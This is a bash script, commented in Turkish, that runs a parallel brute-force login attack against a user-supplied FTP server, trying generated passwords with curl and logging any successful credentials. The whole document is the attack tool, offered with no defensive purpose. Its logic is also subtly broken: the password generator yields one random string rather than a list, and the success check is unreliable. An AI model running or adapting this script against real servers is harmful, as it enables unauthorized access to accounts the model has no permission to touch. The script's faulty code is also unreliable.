#!/bin/bash

# Kullanıcıdan input al
read -p "FTP Sunucusu: " SERVER
read -p "Kullanıcı adı: " USER

# Log dosyası
LOG_FILE="bruteforce.log"

# Log dosyasını temizle
> "$LOG_FILE"

# Rastgele parola oluşturma fonksiyonu
generate_passwords() {
  openssl rand -base64 10 | head -n 10000
}

# Parola listesini oluştur
PASS_LIST="passwords.txt"
generate_passwords > "$PASS_LIST"

# Paralel brute force saldırısı
check_password() {
  local PASS=$1
  echo "Trying $USER:$PASS"
  echo "Trying $USER:$PASS" >> "$LOG_FILE"
  RESPONSE=$(curl -s --user "$USER:$PASS" "ftp://$SERVER" | grep "230")
  if [ -n "$RESPONSE" ]; then
    echo "Login successful: $USER:$PASS"
    echo "Login successful: $USER:$PASS" >> "$LOG_FILE"
    kill 0 # Tüm alt işlemleri sonlandır
    exit 0
  fi
}

export -f check_password
export SERVER USER LOG_FILE

xargs -P 10 -n 1 -I {} bash -c 'check_password "$@"' _ {} < "$PASS_LIST"

echo "Brute force attack finished."
echo "Brute force attack finished." >> "$LOG_FILE"
exit 1